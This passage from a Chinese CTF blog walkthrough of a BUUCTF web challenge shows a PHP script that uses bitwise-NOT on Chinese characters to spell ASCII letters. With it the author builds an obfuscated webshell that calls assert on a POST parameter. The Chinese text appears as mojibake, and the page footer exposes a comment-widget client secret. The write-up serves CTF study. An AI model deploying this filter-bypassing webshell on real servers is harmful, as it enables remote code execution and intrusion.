<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">'Content-Type: text/html; charset=utf-8'</span>);</span><br><span class="line">$str = <span class="string">'å½“æˆ‘ç«™åœ¨å±±é¡¶ä¸Šä¿¯ç°åŠä¸ªé¼“æµªå±¿å’Œæ•´ä¸ªå¦é—¨çš„å¤œç©ºçš„æ—¶å€™ï¼Œæˆ‘çŸ¥é“æ­¤æ¬¡å‡ºè¡Œçš„ç›®çš„å·²ç»å®Œæˆäº†ï¼Œæˆ‘è¦å¼€å§‹æ”¶æ‹¾è¡Œæï¼Œæ˜å¤©æ—©ä¸Šç¦»å¼€è¿™é‡Œã€‚å‰å‡ å¤©æœ‰äººé—®æˆ‘ï¼Œå¤§å­¦å››å¹´ç»“æŸäº†ï¼Œä½ ä¹Ÿä¸è¯´ç‚¹ä»€ä¹ˆï¼Ÿä¹Œäº‘å‘ç”Ÿäº†ä¸€äº›äº‹æƒ…ï¼Œæ‰€æœ‰äººéƒ½ç¼„é»˜ä¸è¨€ï¼Œä½ ä¹Ÿæ˜¯ä¸€æ ·å—ï¼Ÿä½ é€ƒåˆ°å—æ–¹ï¼Œéš¾é“ä¸å›å®¶äº†å—ï¼Ÿå½“ç„¶è¦å›å®¶ï¼Œæˆ‘åªæ˜¯æƒ³æ‰¾åˆ°æˆ‘è¦æ‰¾çš„ç­”æ¡ˆã€‚å…¶å®è¿™æ¬¡å‡ºæ¥ä¸€è¶Ÿå¾ˆç´¯ï¼Œæ™šä¸Šå‡ ä¹æ˜¯çƒ­æ±—æ·‹æ¼“å›åˆ°ä½å¤„ï¼Œå¦é—¨çš„æµ·é£ä¼´ç€å¦®å¦²è·¯è¿‡åå¸¦æ¥çš„æ·…æ·…æ²¥æ²¥çš„å°é›¨ï¼Œä¹Ÿå»ä¸èµ°æˆ‘èº«ä¸Šä»»ä½•ä¸€ä¸ªæ¯›å­”é‡Œçš„çƒ­æ°”ã€‚å¥½åœ¨æ—…ç¤¾çš„ç”Ÿæ´»ç”¨å“ä¸€åº”ä¿±å…¨ï¼Œæ´—å®Œæ¾¡åæˆ‘çˆ¬åˆ°å±‹é¡¶ã€‚æ—…ç¤¾æ˜¯ä¸€ä¸ªè€åˆ«å¢…ï¼Œè¯´èµ·æ¥ä¹Ÿä¸ç®—è€ï¼Œæ¯”èµ·éš”å£ä¸€å®¶æ—§ä¸­å›½æ—¶æœŸçš„æˆ¿å­è¦è±ªåå¾—å¤šï¼Œç«–ç«‹åœ¨ç¬”å±±é¡¶ä¸Šä¸å¦é—¨å²›éš”æµ·ç›¸æœ›ã€‚ç«™åœ¨å±‹é¡¶å‘ä¸‹çœ‹ï¼Œç¯ç«é˜‘çŠçš„é¼“æµªå±¿è¡—å¸‚å‚æ‚åœ¨ç»¿æ ‘ä¸æ¥¼å®‡é—´ï¼Œä¾ç¨€è¿˜å¯ä»¥çœ‹åˆ°ç†™ç†™æ”˜æ”˜çš„æ¸¸å®¢ã€‚å¤§æ¦‚æ˜¯å¤œæ™šæ¸æ·±çš„ç¼˜æ•…ï¼Œå‘¨å›´æ…¢æ…¢å˜å¾—å®é™ä¸‹æ¥ï¼Œæˆ‘å¿˜è®°ç™½å¤©åœ¨å¥”æ³¢ä»€ä¹ˆï¼Œç›´åˆ°ç«™åœ¨è¿™é‡Œçš„æ—¶å€™ï¼Œæˆ‘æ‰çŸ¥é“æˆ‘å¯»æ‰¾çš„ç­”æ¡ˆå¹¶ä¸åœ¨å—æ–¹ã€‚å½“ç„¶ä¹Ÿä¸åœ¨åŒ—æ–¹ï¼ŒåŒ—äº¬çš„å¾ˆå¤šä¸œè¥¿è®©æˆ‘éå¸¸ä¸§æ°”ï¼ŒåŒ…æ‹¬è‡ªæ˜åŸå¢“çš„ä¸­ä»‹å’Œé¢æŒ‡æ°”ä½¿çš„å¤§äººä»¬ï¼›åŒ—äº¬ä¹Ÿæœ‰å¾ˆå¤šä¸œè¥¿è®©æˆ‘å–œæ¬¢ï¼Œæˆ‘å–œæ¬¢é¢å’Œå›­å¤è‰²å¤é¦™çš„ç‰æ¾œå ‚ï¼Œæˆ‘å–œæ¬¢æœé˜³é—¨é‚£å—â€œæ°¸å»¶å¸ç¥šâ€çš„ç‰ŒåŠï¼Œå–œæ¬¢åŒ—äº¬é³æ¬¡æ ‰æ¯”çš„è€å®…å­å’Œå—é”£é¼“å··çš„å°åƒã€‚ä½†è¿™äº›éƒ½ä¸æ˜¯æˆ‘è¦çš„ç­”æ¡ˆï¼Œæˆ‘ä¹Ÿä¸çŸ¥é“æˆ‘è¿½éšçš„æ˜¯ä»€ä¹ˆï¼Œä½†æƒ³æƒ³ç™¾å¹´åç•™ä¸‹çš„åˆæ˜¯ä»€ä¹ˆï¼Œæƒ³æƒ³å°±å¾ˆå¯æ€•ã€‚æˆ‘æ›¾ç»ä¸ºäº†åƒä¸€ç¢—è‡­è±†è…ï¼Œåç€ä¼˜æ­¥ä»ä¸Šåœ°åˆ°åŒ—æµ·åŒ—ï¼Œå…´å†²å†²åœ°æ¥åˆ°é‚£ä¸ªå‚æ¶å·²ä¹…çš„è±†è…æ‘Šå‰ï¼Œç”¨æ€¥åˆ‡åˆå®³ç¾çš„å£å»å¯¹è€æ¿è¯´ï¼Œæ¥ä¸¤ä»½é‡çš„è‡­è±†è…ã€‚å…¶å®ä¹Ÿåªè¦10å—é’±ï¼Œåƒå®Œä»¥åä¾¿æ˜¯æ— ä¸ä¼¦æ¯”çš„æ»¡è¶³æ„Ÿã€‚æˆ‘è®°å¾—é‚£æ˜¯æ¯•ä¸šè®¾è®¡å®¡æ ¸å‰å¤•çš„ä¸€ä¸ªåˆåï¼Œäº”æœˆçš„åŒ—äº¬è¿˜ä¸ç®—ç‚çƒ­ï¼Œå’Œç…¦çš„é˜³å…‰é¡ºç€è·¯è¾¹è€æˆ¿å­çš„å±‹æªæ´’å‘å¤§åœ°ï¼Œä½†æˆ‘è¿˜æ˜¯ä¸æ•¢ç«™åœ¨é˜³å…‰ä¸‹ï¼Œæ˜¥å¤©çš„ç‡¥çƒ­éš¾è€ä¹Ÿç»ä¸è¾“ç»™å¤å¤©ã€‚å°±åƒå¾ˆå¤šäººå†·å˜²çƒ­è®½çš„é‚£æ ·ï¼Œåšè¿™ä¸€è¡Œè°æ•¢æŠŠè‡ªå·±å®Œå…¨æ›å…‰ï¼Œç”­ç®¡ä½ æ˜¯é»‘å¸½å­ç™½å¸½å­è¿˜æ˜¯ç»¿å¸½å­ã€‚ç”Ÿæ´»åœ¨é‚£ä¸ªæ—¶å€™è¿˜ç®—ç¾å¥½ï¼Œæˆ‘ä¾æ—§æ˜¯ä¸€ä¸ªå­¦ç”Ÿï¼Œå‡ å¤©å‰è¾åˆ«çš„åŒä¼´è¿˜åœ¨æœä¹æ™šäº”çš„å·¥ä½œï¼Œä¸€åˆ‡éƒ½ç…§æ—§è¿è¡Œï¼Œæ³¢æ¾œä¸è¿œèµ°åƒé‡Œåƒè±†è…è¿™ç§ç†æƒ³ä¸»ä¹‰çš„äº‹æƒ…è¿™å‡ å¹´åœ¨æˆ‘èº«ä¸Šå±¡å±¡å‘ç”Ÿï¼Œç”šè‡³å—ä¸‹æ­¤è¡Œä¹Ÿä¸ä¾‹å¤–ã€‚ä¸€å¹´å‰çš„è¿™ä¸ªæ—¶å€™æˆ‘è®¸è¿‡ä¸€ä¸ªå¿ƒæ„¿ï¼Œåœ¨å—æ™®é™€ï¼Œæˆ‘ç‰¹ä¸ºæ­¤æ¥è¿˜æ„¿ã€‚ç†æƒ³åŒ–ã€å•çº¯ä¸æ‹æ—§ï¼Œå…¶ä¸­å•çº¯å¯ä¸æ˜¯ä¸€ä¸ªå¤šä¹ˆä»¤äººç§°èµçš„å½¢å®¹ï¼Œå¾ˆå¤šäººæŠŠä»–å’Œå‚»æŒ‚é’©ã€‚â€œä½ å¤ªå•çº¯äº†ï¼Œä½ è¿˜æƒ³ç€è¿™ä¸€åˆ‡ä¼šå¥½èµ·æ¥â€ï¼Œå¯¹å‘€ï¼Œåœ¨ç”·æ¬¢å¥³çˆ±é‚£äº›äº‹æƒ…ä¸Šï¼Œæˆ‘å¯ä¸å•çº¯ï¼Œä½†æœ‰äº›èƒ½è®©äººå˜å¾—åœ†æ»‘ä¸ä¸–æ•…çš„æŠ‰æ‹©ä¸­ï¼Œæˆ‘å®æ„¿æƒ³çš„æ›´å•çº¯ä¸€äº›ã€‚å»å¹´å†¬å¤©å­¤èº«ä¸€äººæ¥åˆ°åŒ—äº¬ï¼Œæ”¾å¼ƒäº†åœ¨è…¾è®¯åšä¸€ä¸ªå®‰é€¸çš„å®ä¹ ç”Ÿçš„æœºä¼šï¼ŒåŸå› æœ‰å¾ˆå¤šä¹Ÿå¾ˆéš¾è¯´ã€‚åœ¨è…¾è®¯çŸ­æš‚çš„å®ä¹ ç”Ÿæ´»è®©æˆ‘è®°å¿†çŠ¹æ–°ï¼Œæˆ‘æ„Ÿè§‰è¿™è¾ˆå­ä¸ä¼šå†åƒä¸€ä¸ªå°å­©ä¸€æ ·è¢«æ‰€æœ‰äººå® äº†ï¼Œè¿™äº›å½“æˆ‘é€‰æ‹©åŒ—æ¼‚çš„æ—¶å€™åº”è¯¥å°±è¦æƒ³åˆ°çš„ã€‚åŒ—äº¬çš„å†¬å¤©åˆºéª¨çš„å¯’å†·ï¼Œç‰¹åˆ«æ˜¯2015å¹´çš„è…Šæœˆï¼Œæœ‰å‡ å¤©è¿ç»­ä¸‹ç€æš´é›ªï¼Œè·¯ä¸Šçš„ç§¯é›ªä¸€è¸©åŠæ­¥æ·±ï¼Œå’¯å±å’¯å±å“ï¼Œå‘¨é­å´é™çš„åƒæ·±å±±é‡Œçš„å¤åˆ¹ã€‚æˆ‘ä½çš„å°åŒºç¦»å…¬å¸æœ‰ä¸€æ®µè·ç¦»ï¼Œæ‰ä¸‹é›ªçš„é‚£å¤©æˆ‘ç”šè‡³è¿˜èµ°ç€å›å®¶ã€‚åŒ—äº¬çš„å†¬å¤©æœ€å¯æ€•çš„æ˜¯å¯’é£ï¼Œèµ°åˆ°å®¶é‡Œè€³æœµå·²ç»ç¡¬é‚¦é‚¦å¥½åƒä¸€ç¢°å°±ä¼šç¢ï¼Œåœ¨æˆ‘ä¸€å¤´æ‰è¿›è¢«çªé‡Œçš„æ—¶å€™ï¼Œæˆ‘å´æ…¢æ…¢å–œæ¬¢ä¸Šè¿™ä¸ªå¤éƒ½äº†ã€‚æˆ‘æƒ³åˆ°ã€Šé›æ­£çš‡å¸ã€‹é‡Œèƒ¤ç¦›åœ¨åŒ—äº¬çš„é¹…æ¯›å¤§é›ªé‡Œæ”¾å‡ºåä¸‰çˆ·ï¼Œé‚£ä¸ªæ‹¼å‘½åä¸‰éƒå¸¦ç€ä»¤ç‰Œå–ä¸‹ä¸°å°å¤§è¥çš„å…µæƒï¼Œä¿äº†å¤§æ¸…æ±Ÿå±±ç››ä¸–çš„å»¶ç»­ä¸ç¨³å›ºã€‚é‚£ä¸€å¤œï¼ŒåŒ—äº¬çš„æ¼«å¤©å¤§é›ªç»ä¸é€Šäºä»Šæ—¥ï¼Œè€Œæ˜”äººå·²ä½œå¤ï¼Œæ¥è€…å°šä¸èƒ½åŠï¼Œå¤šä¹ˆæ‚²å“€ã€‚è¿™ä¸ªå¤éƒ½æ‰¿è½½ç€å¤ªå¤šå†å²çš„åšé‡æ„Ÿï¼Œç‰¹åˆ«æ˜¯ä¸‹é›ªçš„å­£èŠ‚ï¼Œæˆ‘å¯ä»¥æƒ³åˆ°ä¹¾æ¸…å®«å‰å¹¿åœºä¸Šåƒç™¾å¹´å¯‚å¯çš„é›•é¾™ä¸é“œé¾Ÿï¼Œå±‹æªä¸Šçš„ç§¯é›ªï¼Œé«˜é«˜åœ¨ä¸Šçš„é¸±å»ï¼Œæƒ³åˆ°æ•°ç™¾å¹´çš„æ²§æ¡‘ä¸æœä»£æ›´è¿­ã€‚é›ªåœçš„é‚£å¤©æˆ‘å»äº†é¢å’Œå›­ï¼Œæˆ‘è®°å¾—æˆ‘ç­‰äº†å¾ˆä¹…æ‰æ‘‡æ‘‡æ‘†æ‘†æ¥äº†ä¸€è¾†å…¬äº¤è½¦ï¼Œè½¦ä¸Šå‡ ä¹æ²¡æœ‰äººï¼Œå¸æœºå°å¿ƒç¿¼ç¿¼åœ°è½¬åŠ¨ç€æ–¹å‘ç›˜ï¼Œåœ¨æ¹¿æ»‘çš„é“è·¯ä¸Šç¼“æ…¢å‰è¡Œã€‚çª—å¤–ç™½èŒ«èŒ«ä¸€ç‰‡ï¼Œé˜³å…‰ç…§åœ¨é›ªåœ°ä¸Šæœ‰äº›åˆºçœ¼ï¼Œæˆ‘æ‰ä½ä¸‹å¤´ã€‚é¢å’Œå›­çš„å­¦ç”Ÿç¥¨ç”šè‡³æ¯”åœ°é“ç¥¨è¿˜ä¾¿å®œã€‚åœ¨æ˜†æ˜æ¹–ç•”çœºæœ›æ¹–é¢ï¼Œå¾®å¾®æ³›ç€å¤•é˜³éœå…‰çš„æ¹–æ°´å°šæœªç»“å†°ï¼Œè¸©ç€é‚£äº›å¯èƒ½è¢«å¾¡ç¢¾è½§è¿‡çš„åœŸåœ°ï¼Œæ»‘äº†æ— æ•°è·¤ï¼Œæœ€ååªèƒ½æ‰¶ç€æ¹–è¾¹çš„çŸ³ç‹®å­å¹æ°”ï¼Œä¸ºä»€ä¹ˆæ²¡ç©¿é˜²æ»‘çš„é‹å­ã€‚æ˜†æ˜æ¹–è¿™ä¸€æ±ªæ¸…æ°´ï¼Œè§è¯äº†å…‰ç»ªçš‡å¸è¢«å›šç¦åè½½çš„è¹‰è·å²æœˆï¼Œè§è¯äº†é™å®‰å…ˆç”Ÿèª“ä¸ºå…ˆæœè€Œè‡ªæººï¼Œä¹Ÿè§è¯äº†å…±å’Œå›½ä»¥æ¥å›ºå®ˆä¸å¼€æ”¾çš„äº¤å ã€‚è¯´èµ·æ¥ï¼Œå®¶é‡Œæœ‰æœ¬å«çªè‘—çš„ã€Šäººé—´è¯è¯å…¸è¯„ã€‹ï¼Œæœ¬æƒ³ä¹°æ¥ç»ä»°ä¸€ä¸‹ç‹é™å®‰çš„è¿™ç¯‡å¤å…¸ç¾å­¦å·¨è‘—ï¼Œæ²¡æƒ³åˆ°å…¨ä¹¦å¤šæ˜¯ä»¥æ‰¹åˆ¤ä¸ºä¸»ã€‚æˆ‘è‡ªè¯©æƒ³å½“æ–‡äººçš„é»‘å®¢ï¼Œå…¶å®ä¹Ÿåªæ˜¯å˜´é‡Œè¯´è¯´ï¼ŒçœŸåˆ°è¯„è¯´æ–‡ç« æ˜¯éçš„æ—¶å€™ï¼Œæˆ‘å´å¼ å£æ— è¯ã€‚å€’æ˜¯èª“æ­»ä¸å»å‘ï¼Œè¿™ç‚¹ç¡®å®è®©æˆ‘æ— é™æ„Ÿæ…¨ï¼šä¸­å›½å£«å¤§å¤«çš„éª¨æ°”ï¼ŒçœŸçš„æ˜¯ä»å±ˆåŸæŠ•æ°´çš„é‚£ä¸€åˆ»å°±å¥ å®šä¸‹æ¥çš„ã€‚æœ‰å¥è¯è¯´ï¼Œå¤å¾€ä»Šæ¥ä¸­å›½ä¸‰å¤§å¤©æ‰æ­»äºæ°´ï¼Œå…¶ä¸€å±ˆåŸï¼Œå…¶äºŒæç™½ï¼Œå…¶ä¸‰ç‹å›½ç»´ã€‚å«çªå¯¹æ­¤è¯é¢‡æœ‰ä¸æœï¼Œä¸çº ç»“ç‹å›½ç»´æ˜¯å¦èƒ½å¤Ÿä¸å‰äºŒè€…ç›¸æå¹¶è®ºï¼Œæˆ‘å•å–œæ¬¢ä»–çš„ç›´ç™½ï¼Œèƒ½ç•…å¿«è¯„è¯´å¤ä»Šè¯è¯çš„äººï¼Œä¹Ÿè®¸æ— å‡ºå…¶å³äº†å§ã€‚äººè¨€å¯ç•ã€äººè¨€å¯ç•ï¼Œè¶Šåˆ°ç°ä»£è¶Šä¼šæ·±æ·±æ„Ÿè§‰åˆ°è¿™å¥è¯çš„æ­£ç¡®ï¼Œçœ‹åˆ°å¾ˆå¤šäº‹æƒ…çš„å‘å±•å¾€å¾€è¢«èˆ†è®ºæ‰€å·¦å³ï¼Œå°±è¶Šç¾¡æ…•é‚£äº›æ— æ‰€ç•æƒ§çš„äººï¼Œä¸è®ºä»–ä»¬æ˜¯å‹‡æ•¢è¿˜æ˜¯è‡ªè´Ÿã€‚æ­¤é—´äººç‹å ç®—ä¸€ä¸ªï¼Œç½‘ç»œä¸Šäººä»¬å¯¹ä»–æ¯èª‰å‚åŠï¼Œä½†ç¡®å®æœ‰æœ¬äº‹è€Œåˆä¸çŸ«æ‰åšä½œï¼Œæ”¾èƒ†ç›´è¨€å¿ƒæ¯”å¤©é«˜çš„åªæœ‰ä»–ä¸€ä¸ªäº†ã€‚é‚£å¤©åœ¨æ˜†æ˜æ¹–ç•”çœ‹è¿‡å¤•é˜³ï¼Œç›´åˆ°å¤©ç©ºå˜çš„æ— æ¯”æ·±é‚ƒï¼Œæˆ‘æ‰æ…¢æ…¢å¾€å®¶çš„æ–¹å‘èµ°ã€‚è€³æœºæ”¾ç€åå¼¦çš„ã€Šæ˜†æ˜æ¹–ã€‹ï¼Œä¸çŸ¥ä¸è§‰å·²ç»åå¹´äº†ï¼Œä¸çŸ¥é“è¿™æ—¶å€™ä»–æœ‰æ²¡æœ‰å›é¦–æœ›æœ›è‡ªå·±çš„ä¹å…¬ä¸»å’Œå®‰å¨œï¼Œæ˜¯å¦è¿˜èƒ½å¤Ÿâ€œæ³¼å¢¨é€ ä¸€åŒ¹å¿«é©¬ï¼Œè¿½å›åå¹´å‰å§‘å¨˜â€ã€‚åæ¥ï¼Œæ„Ÿè§‰ä¸€åˆ‡éƒ½æ­¥å…¥æ­£è½¨ï¼Œå­¦ä½è¯ä¹Ÿé¡ºåˆ©æ‹¿åˆ°ï¼Œæˆ‘åŒ†åŒ†å‘Šåˆ«äº†è‡ªå·±çš„å¤§å­¦ã€‚åæ¥ä¹Ÿé‡åˆ°äº†å¾ˆå¤šäº‹ï¼Œäº‹åæœ‰äººæ‰¾æˆ‘ï¼Œå¾ˆå¤šäººå…³å¿ƒä½ ï¼Œå°‘æ•°äººå¯èƒ½ä¸æ˜¯ï¼Œä½†å‡ºäº†å­¦æ ¡ä»¥åï¼Œåˆæœ‰å¤šå°‘äººå’Œäº‹æƒ…å®Œå…¨æ²¡æœ‰ç›®çš„å‘¢ï¼Ÿæˆ‘ä¹Ÿè€ƒè™‘äº†å¾ˆå¤šå»å¤„ï¼Œä½†ä¸€ç›´æ²¡æœ‰å†³æ–­ï¼Œå€’æœ‰å¿µæ€€æ—§ä¸»ï¼Œä¹Ÿæœ‰å¦„è‡ªè²è–„ä¹‹æ„ï¼Œæˆ‘å¸Œæœ›è‡ªå·±èƒ½åšå‡ºç‚¹æˆç»©å†å»è°ˆå…¶ä»–çš„ï¼Œæ‰€ä»¥å¾ˆä¹…éƒ½æ˜¯é—­é—¨ä¸å‡ºï¼Œç¢ç£¨ä¸œè¥¿ã€‚æ¥åˆ°å¦é—¨ï¼Œæˆ‘è¿˜äº†ä¸€ä¸ªæ„¿ï¼Œåˆè®¸äº†æ–°çš„æ„¿æœ›ï¼Œå¸Œæœ›æˆ‘è¿˜ä¼šå†æ¬¡æ¥è¿˜æ„¿ã€‚æˆ‘åˆæ¥åˆ°äº†ä¸Šæ¬¡æ²¡ä½å¤Ÿçš„é¼“æµªå±¿ï¼Œè®¢äº†ä¸€é—´å®‰é™çš„æˆ¿å­ï¼Œåªæœ‰æˆ‘ä¸€ä¸ªäººã€‚åœ¨è¿™é‡Œï¼Œèƒ½å¬åˆ°çš„åªæœ‰è¿œå¤„å±‹æªä¸‹é¸Ÿå„¿å½å½å–³å–³çš„é¸£å«å£°ï¼Œè¿œå¤„çš„å–§åš£æ—©å·²çƒŸæ¶ˆäº‘æ•£ï¼Œå³ä½¿è¿™åªæ˜¯æš‚æ—¶çš„ã€‚ç«™åœ¨å±‹é¡¶çš„æˆ‘ï¼Œå–ä¸‹æ¯ä¸­æœ€åä¸€å£æ°´ã€‚æ¸…æ™¨ï¼ŒèƒŒç€è¡Œæï¼Œæˆ‘ä¹˜è½®æ¸¡ç¦»å¼€äº†é¼“æµªå±¿ï¼Œè¿™æ˜¯æˆ‘ç¬¬äºŒæ¬¡æ¥é¼“æµªå±¿ï¼Œè°çŸ¥é“ä¼šä¸ä¼šæ˜¯æœ€åä¸€æ¬¡ã€‚æˆ‘åœ¨è¿™é‡Œä½äº†ä¸‰å¤©ï¼Œç”¨ä¸‰å¤©å»å¯»æ‰¾äº†ä¸€ä¸ªç­”æ¡ˆã€‚ä¸çŸ¥ä¸è§‰æˆ‘åˆæƒ³åˆ°è¾œé¸¿é“­ä¸æ²ˆå­åŸ¹çš„é‚£æ®µå¯¹è¯ã€‚â€œå¤§éš¾ä¸´å¤´ï¼Œä½•ä»¥ä¸ºä¹‹ï¼Ÿâ€â€œä¸–å—å›½æ©ï¼Œæ­»ç”Ÿç³»ä¹‹ã€‚â€'</span>;</span><br><span class="line"><span class="keyword">for</span>($i=<span class="number">0</span>; $i&lt;mb_strlen($str, <span class="string">'utf-8'</span>); $i++)</span><br><span class="line">&#123;</span><br><span class="line">	$st = mb_substr($str, $i,<span class="number">1</span>, <span class="string">'utf-8'</span>);</span><br><span class="line">	$a = ~($st);</span><br><span class="line">	$b = $a[<span class="number">1</span>];				<span class="comment">#å–æ±‰å­—çš„ç¬¬ä¸€ä½</span></span><br><span class="line">	<span class="keyword">if</span>($b==$_GET[<span class="string">'a'</span>])		<span class="comment">#$_GET['a']æƒ³è¦å¾—åˆ°çš„å­—ç¬¦</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">echo</span> $st;<span class="keyword">exit</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>æ„é€ webshell</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">    $__=[];</span></span><br><span class="line"><span class="php">    $___=[];</span></span><br><span class="line"><span class="php">    $_=$__==$___;<span class="comment">//true = 1   ç”¨ä½œç´¢å¼•</span></span></span><br><span class="line"><span class="php">    </span></span><br><span class="line"><span class="php">    $__=~(ç°);</span></span><br><span class="line"><span class="php">    $___=$__[$_];<span class="comment">//a</span></span></span><br><span class="line"><span class="php">    $__=~(åŒ—);</span></span><br><span class="line"><span class="php">    $___.=$__[$_].$__[$_];<span class="comment">//ss</span></span></span><br><span class="line"><span class="php">    $__=~(çš„);</span></span><br><span class="line"><span class="php">    $___.=$__[$_];<span class="comment">//e</span></span></span><br><span class="line"><span class="php">    $__=~(åŠ);</span></span><br><span class="line"><span class="php">    $___.=$__[$_];<span class="comment">//r</span></span></span><br><span class="line"><span class="php">    $__=~(æ‹¾);</span></span><br><span class="line"><span class="php">    $___.=$__[$_];<span class="comment">//t</span></span></span><br><span class="line"><span class="php">    </span></span><br><span class="line"><span class="php">    $____=~(~(_));<span class="comment">//_</span></span></span><br><span class="line"><span class="php">    $__=~(è¯´);</span></span><br><span class="line"><span class="php">    $____.=$__[$_];<span class="comment">//P</span></span></span><br><span class="line"><span class="php">    $__=~(å°);</span></span><br><span class="line"><span class="php">    $____.=$__[$_];<span class="comment">//O</span></span></span><br><span class="line"><span class="php">    $__=~(æ¬¡);</span></span><br><span class="line"><span class="php">    $____.=$__[$_];<span class="comment">//S</span></span></span><br><span class="line"><span class="php">    $__=~(ç«™);</span></span><br><span class="line"><span class="php">    $____.=$__[$_];<span class="comment">//T</span></span></span><br><span class="line"><span class="php">    </span></span><br><span class="line"><span class="php">    $_=$$____;</span></span><br><span class="line"><span class="php">    $___($_[_]);    </span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>
<p>è¿™é¢˜è¿˜æ²¡å¤ç°æˆåŠŸï¼Œåç»­ä¼šè¡¥å……â€¦</p>
</div><ul class="post-copyright"><li><strong>Post Title: </strong><a href="http://ggb0n.cool/2020/02/15/BUUCTF-webåˆ·é¢˜â…¢/">BUUCTF-webåˆ·é¢˜â…¢</a></li><li><strong>Post Author: </strong><a href="http://ggb0n.cool">ggb0n</a></li><li><strong>Post Link: </strong><a href="http://ggb0n.cool/2020/02/15/BUUCTF-webåˆ·é¢˜â…¢/">http://ggb0n.cool/2020/02/15/BUUCTF-webåˆ·é¢˜â…¢/</a></li><li><strong>Copyright Notice: </strong><span>All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" rel="external nofollow" target="_blank">CC BY-NC-SA 4.0</a> unless stating additionally.</span></li></ul><div><div class="recommend-post"><span class="is-size-6 has-text-grey has-mr-7">#Â Related Post</span><br><span>Â Â 1.<a class="is-size-6" href="/2020/03/04/GWCTF2019%E5%A4%8D%E7%8E%B0/" target="_blank">GWCTF2019å¤ç°</a><br></span><span>Â Â 2.<a class="is-size-6" href="/2020/02/10/BUUCTF-web%E5%88%B7%E9%A2%98%E2%85%A1/" target="_blank">BUUCTF-webåˆ·é¢˜â…¡</a><br></span><span>Â Â 3.<a class="is-size-6" href="/2020/02/07/BUUCTF-web%E5%88%B7%E9%A2%98%E2%85%A0/" target="_blank">BUUCTF-webåˆ·é¢˜â… </a><br></span></div><div class="recommend-post"><span class="is-size-6 has-text-grey has-mr-7">#Â Recommend Post</span><br><span>Â Â 1.<a class="is-size-6" href="/2020/05/02/De1CTF2020%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/" target="_blank">De1CTF2020éƒ¨åˆ†é¢˜è§£</a><br></span><span>Â Â 2.<a class="is-size-6" href="/2020/04/03/FTP%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%90%AD%E5%BB%BA%E5%8F%8A%E5%85%B8%E5%9E%8B%E9%97%AE%E9%A2%98%E7%9A%84%E8%A7%A3%E5%86%B3/" target="_blank">FTPæœåŠ¡å™¨æ­å»ºåŠå…¸å‹é—®é¢˜çš„è§£å†³</a><br></span><span>Â Â 3.<a class="is-size-6" href="/2020/04/01/golang%E7%BC%96%E8%AF%91%E9%A1%B9%E7%9B%AE%E7%9A%84%E4%B8%80%E4%B8%AA%E5%B7%A8%E5%9D%91/" target="_blank">golangç¼–è¯‘é¡¹ç›®çš„ä¸€ä¸ªå·¨å‘</a><br></span><span>Â Â 4.<a class="is-size-6" href="/2020/04/16/obfs4%E7%BD%91%E6%A1%A5%E9%97%AE%E9%A2%98%E7%9A%84%E5%A4%84%E7%90%86/" target="_blank">obfs4ç½‘æ¡¥é—®é¢˜çš„å¤„ç†</a><br></span><span>Â Â 5.<a class="is-size-6" href="/2020/04/09/%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9CCNN%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/" target="_blank">å·ç§¯ç¥ç»ç½‘ç»œCNNå…¥é—¨</a><br></span><span>Â Â 6.<a class="is-size-6" href="/2020/04/09/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86/" target="_blank">æœºå™¨å­¦ä¹ åŸºæœ¬çŸ¥è¯†</a><br></span></div></div><link rel="stylesheet" href="https://cdnjs.loli.net/ajax/libs/social-share.js/1.0.16/css/share.min.css"><div class="social-share"></div><script src="https://cdnjs.loli.net/ajax/libs/social-share.js/1.0.16/js/social-share.min.js"></script></article></div><div class="card"><div class="card-content"><h3 class="menu-label has-text-centered">Like this article? Support the author with</h3><div class="buttons is-centered"><a class="button is-success donate"><span class="icon is-small"><i class="fab fa-weixin"></i></span><span>Wechat</span><span class="qrcode"><img src="http://ggb0n.cool/images/emFuc2hhbmc=.png" alt="Wechat"></span></a></div></div></div><nav class="post-navigation mt-4 level is-mobile"><div class="level-start"><a class="article-nav-prev level level-item link-muted" href="/2020/02/18/BSidesSF2019-WriteUp/"><i class="level-item fas fa-chevron-left"></i><span class="level-item">BSidesSF2019-WriteUp</span></a></div><div class="level-end"><a class="article-nav-next level level-item link-muted" href="/2020/02/14/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98SQL%E6%B3%A8%E5%85%A5%E9%A2%98%E7%9B%AE%E8%A7%A3%E6%9E%90/"><span class="level-item">æå®¢å¤§æŒ‘æˆ˜é¢˜ç›®è§£æ</span><i class="level-item fas fa-chevron-right"></i></a></div></nav><div class="card"><div class="card-content"><h3 class="title is-5">Comments</h3><div id="comment-container"></div><link rel="stylesheet" href="https://cdnjs.loli.net/ajax/libs/gitalk/1.6.0/gitalk.css"><script> $.getScript('/js/gitalk.min.js', function () { 
            var gitalk = new Gitalk({
            id: '7b84e2402b3c39c7a94d8e35498852a9',
            repo: 'blog_comment',
            owner: 'ggb0n',
            clientID: '0a75c84e24da4e774d10',
            clientSecret: '80c72733da730b019e5047ae6c7eff937914a4d9',
            admin: ["ggb0n"],
            createIssueManually: true,
            distractionFreeMode: false,
            perPage: 10,
            pagerDirection: 'last',
            
            
            enableHotKey: true,
            isLocked: false
        })
